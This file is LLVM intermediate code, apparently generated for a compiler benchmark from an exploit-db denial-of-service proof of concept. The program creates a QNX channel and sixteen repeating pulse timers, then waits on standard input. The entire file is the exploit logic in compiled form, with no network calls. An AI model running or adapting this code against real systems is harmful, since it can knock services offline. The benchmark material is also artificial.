; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/dos/extr_21984.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/dos/extr_21984.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sigevent = type { i32 }
%struct._itimer = type { i32, i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"Can't create channel!\0A\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"Can't connect to channel!\0A\00", align 1
@_PULSE_CODE_MINAVAIL = common dso_local global i64 0, align 8
@CLOCK_REALTIME = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"Can't create timer!\0A\00", align 1
@stdin = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sigevent, align 4
  %7 = alloca %struct._itimer, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 @ChannelCreate(i32 0)
  store i32 %12, i32* %8, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %18

14:                                               ; preds = %2
  %15 = load i32, i32* @stderr, align 4
  %16 = call i32 @fprintf(i32 %15, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 @exit(i32 -1) #3
  unreachable

18:                                               ; preds = %2
  %19 = call i32 (...) @getpid()
  %20 = load i32, i32* %8, align 4
  %21 = call i32 @ConnectAttach(i32 0, i32 %19, i32 %20, i32 0, i32 0)
  store i32 %21, i32* %10, align 4
  %22 = icmp slt i32 %21, 0
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* @stderr, align 4
  %25 = call i32 @fprintf(i32 %24, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %26 = call i32 @exit(i32 -1) #3
  unreachable

27:                                               ; preds = %18
  store i32 0, i32* %11, align 4
  br label %28

28:                                               ; preds = %48, %27
  %29 = load i32, i32* %11, align 4
  %30 = icmp slt i32 %29, 16
  br i1 %30, label %31, label %51

31:                                               ; preds = %28
  %32 = load i32, i32* %10, align 4
  %33 = load i64, i64* @_PULSE_CODE_MINAVAIL, align 8
  %34 = add nsw i64 %33, 1
  %35 = load i32, i32* %11, align 4
  %36 = call i32 @SIGEV_PULSE_INIT(%struct.sigevent* %6, i32 %32, i32 16, i64 %34, i32 %35)
  %37 = load i32, i32* @CLOCK_REALTIME, align 4
  %38 = call i32 @TimerCreate(i32 %37, %struct.sigevent* %6)
  store i32 %38, i32* %9, align 4
  %39 = icmp slt i32 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %31
  %41 = load i32, i32* @stderr, align 4
  %42 = call i32 @fprintf(i32 %41, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %59

43:                                               ; preds = %31
  %44 = getelementptr inbounds %struct._itimer, %struct._itimer* %7, i32 0, i32 0
  store i32 1000000, i32* %44, align 4
  %45 = getelementptr inbounds %struct._itimer, %struct._itimer* %7, i32 0, i32 1
  store i32 1000000, i32* %45, align 4
  %46 = load i32, i32* %9, align 4
  %47 = call i32 @TimerSettime(i32 %46, i32 0, %struct._itimer* %7, i32* null)
  br label %48

48:                                               ; preds = %43
  %49 = load i32, i32* %11, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %11, align 4
  br label %28

51:                                               ; preds = %28
  br label %52

52:                                               ; preds = %57, %51
  %53 = load i32, i32* @stdin, align 4
  %54 = call signext i8 @getc(i32 %53)
  %55 = sext i8 %54 to i32
  %56 = icmp ne i32 %55, 35
  br i1 %56, label %57, label %58

57:                                               ; preds = %52
  br label %52

58:                                               ; preds = %52
  store i32 0, i32* %3, align 4
  br label %59

59:                                               ; preds = %58, %40
  %60 = load i32, i32* %3, align 4
  ret i32 %60
}

declare dso_local i32 @ChannelCreate(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @ConnectAttach(i32, i32, i32, i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @SIGEV_PULSE_INIT(%struct.sigevent*, i32, i32, i64, i32) #1

declare dso_local i32 @TimerCreate(i32, %struct.sigevent*) #1

declare dso_local i32 @TimerSettime(i32, i32, %struct._itimer*, i32*) #1

declare dso_local signext i8 @getc(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
